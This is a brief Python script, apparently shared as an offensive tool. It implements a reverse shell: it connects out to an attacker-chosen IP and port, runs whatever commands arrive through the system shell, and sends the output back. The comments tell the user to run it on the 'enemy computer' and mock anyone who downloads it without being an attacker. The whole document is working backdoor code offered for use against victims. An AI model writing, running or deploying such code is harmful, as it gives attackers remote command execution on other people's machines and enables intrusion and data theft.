#!/usr/bin/python
#Python Reverse Shell
#By The Jester
#Run it on the enemy computer and wait for income connections
#If you watch that and you are not an attacker... then you are idiot downloading a reverse shell

import socket
import subprocess

REMOTE_HOST = '127.0.0.1' # Add the ip  of your machine to connect
REMOTE_PORT = 4444 # Add the port you want it to listen
client = socket.socket()
client.connect((REMOTE_HOST, REMOTE_PORT))

while True:
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    client.send(output + output_error)
